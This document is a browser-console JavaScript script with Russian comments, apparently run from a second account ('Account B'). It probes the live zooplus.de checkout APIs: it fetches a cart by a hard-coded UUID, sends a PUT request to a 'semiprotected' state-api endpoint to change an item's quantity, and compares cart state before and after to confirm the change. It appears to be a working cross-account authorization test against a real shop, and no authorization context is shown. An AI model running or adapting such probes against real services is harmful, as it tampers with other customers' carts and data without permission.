// Проверка через state-api endpoint (может быть актуальнее)
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

(async function() {
  console.log("[*] ========================================");
  console.log("[*] CHECKING CART VIA STATE-API");
  console.log("[*] ========================================");
  
  // Получить корзину ДО через обычный API
  const cartBefore = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  }).then(r => r.json());
  
  console.log("\n[+] Cart BEFORE (via cart-api):");
  console.log(`    Items: ${cartBefore.articles.length}`);
  console.log(`    Total: ${cartBefore.summary.grandTotal} EUR`);
  
  // Получить корзину ДО через state-api
  const stateBefore = await fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/get`, {
    credentials: 'include'
  }).then(r => r.json());
  
  console.log("\n[+] State BEFORE (via state-api):");
  console.log(`    State:`, JSON.stringify(stateBefore, null, 2).substring(0, 500));
  
  // Выполнить PUT запрос
  const articleId = cartBefore.articles.find(a => a.id === 2966422)?.id || cartBefore.articles[0]?.id;
  console.log(`\n[*] Modifying article ${articleId} quantity to 2...`);
  
  const response = await fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
    method: "PUT",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "Accept": "application/json"
    },
    body: JSON.stringify({
      articleId: articleId,
      quantity: 2
    })
  });
  
  const responseText = await response.text();
  console.log(`[+] PUT Response: HTTP ${response.status}`);
  if (response.status === 200) {
    try {
      const json = JSON.parse(responseText);
      console.log(`[+] Response JSON:`, JSON.stringify(json, null, 2).substring(0, 500));
    } catch(e) {
      console.log(`[+] Response text: ${responseText.substring(0, 500)}`);
    }
  }
  
  // Подождать 3 секунды
  console.log(`\n[*] Waiting 3 seconds...`);
  await new Promise(resolve => setTimeout(resolve, 3000));
  
  // Получить корзину ПОСЛЕ через обычный API
  const cartAfter = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  }).then(r => r.json());
  
  console.log("\n[+] Cart AFTER (via cart-api):");
  console.log(`    Items: ${cartAfter.articles.length}`);
  console.log(`    Total: ${cartAfter.summary.grandTotal} EUR`);
  
  // Получить корзину ПОСЛЕ через state-api
  const stateAfter = await fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/get`, {
    credentials: 'include'
  }).then(r => r.json());
  
  console.log("\n[+] State AFTER (via state-api):");
  console.log(`    State:`, JSON.stringify(stateAfter, null, 2).substring(0, 500));
  
  // Сравнить
  console.log("\n[*] ========================================");
  console.log("[*] COMPARISON");
  console.log("[*] ========================================");
  console.log(`    Cart API - Items: ${cartBefore.articles.length} → ${cartAfter.articles.length}`);
  console.log(`    Cart API - Total: ${cartBefore.summary.grandTotal} → ${cartAfter.summary.grandTotal} EUR`);
  
  if (JSON.stringify(stateBefore) !== JSON.stringify(stateAfter)) {
    console.log(`\n    [!!!] State API CHANGED! ✅`);
    console.log(`    This confirms the modification worked!`);
  } else {
    console.log(`\n    State API unchanged`);
  }
  
  // Проверить через state-api с cart UUID
  console.log(`\n[*] Trying state-api with cart UUID...`);
  try {
    const stateCart = await fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/cart/${CART_UUID}`, {
      credentials: 'include'
    }).then(r => r.json());
    console.log(`[+] State Cart:`, JSON.stringify(stateCart, null, 2).substring(0, 500));
  } catch(e) {
    console.log(`[!] Error: ${e.message}`);
  }
})();

